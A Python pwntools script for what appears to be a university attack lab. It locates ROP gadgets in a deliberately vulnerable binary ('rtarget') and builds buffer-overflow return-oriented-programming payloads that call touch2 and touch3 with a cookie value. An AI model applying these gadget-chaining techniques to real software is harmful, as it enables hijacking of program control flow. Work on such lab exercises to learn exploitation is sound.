from pwn import *

e = ELF('/home/ubuntu/workspace/lab3/rtarget')
rop = ROP(e)

touch2 = e.symbols['touch2']

print(hex(touch2))

start = e.symbols['start_farm']
end = e.symbols['end_farm']

print(f"range 0x{start:x}-0x{end:x}")

def is_valid_gadget(addr):
    return start <= addr <= end

def to_hex(s):
    return " ".join(f"{b:02x}" for b in s)

context.arch = "amd64"
for reg in ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'rsp', 'rbp']:
    ins = [f'pop {reg}', 'ret']
    try:
        gadget = rop.find_gadget(ins)[0]
        print(hex(gadget), ins)
    except TypeError:
        continue
# ins = ['ret']
# gadget = rop.find_gadget(ins)[0]
# print(hex(gadget), ins)

ins = ['pop rdi', 'ret']
code = asm('pop rdi') + asm('ret')
print(to_hex(code))

ins1 = 0x402e93  # pop rdi; ret
ins3 = 0x401f3d # pop rax; nop; ret
ins4 = 0x401f55 # mov eax, edi; ret
ins2 = 0x40101a  # ret
cookie = 0x7f7639c5
# payload_str = b"A" * 0x28 + p64(touch2) + p64(cookie) + p64(ins1)
payload_str = b"A" * 0x38 + p64(ins3) + p64(cookie)  + p64(ins4) + p64(touch2)

print("len:", hex(len(payload_str)))
print(to_hex(payload_str))

with open("payload2s", "wb") as f:
    f.write(payload_str)


# rsp            0x7ffffff91d98
# rsp            0x7ffffffe3fb8

ins1 = 0x402006 # mov %rsp %rax; ret
ins2 = 0x401f54 # mov %rax %rdi; ret
ins3 = 0x402e93 # pop rdi; ret
ins4 = 0x401735 # pop rsi; ret
ins5 = 0x401f9b # leaq (%rdi,%rsi),%rax;ret
ins6 = 0x40101a  # ret

# mov %rsp %rax; ret
# mov %rax %rdi; ret
# pop rsi; ret ;-0x38
# leaq (%rdi,%rsi),%rax;ret
# mov %rax %rdi; ret
# touch3
cookie_str = b"7f7639c5\0"
touch3 = e.symbols['touch3']
payload = cookie_str + b'A'*(0x38-9) + p64(ins1) + p64(ins2) + p64(ins4) + p64(-0x40, sign="signed") + p64(ins5) + p64(ins2) + p64(ins6) + p64(touch3)

print(to_hex(payload))
print(hex(len(payload)))

with open("payload3s", "wb") as f:
    f.write(payload)

print(disasm(bytes.fromhex("5890c3")))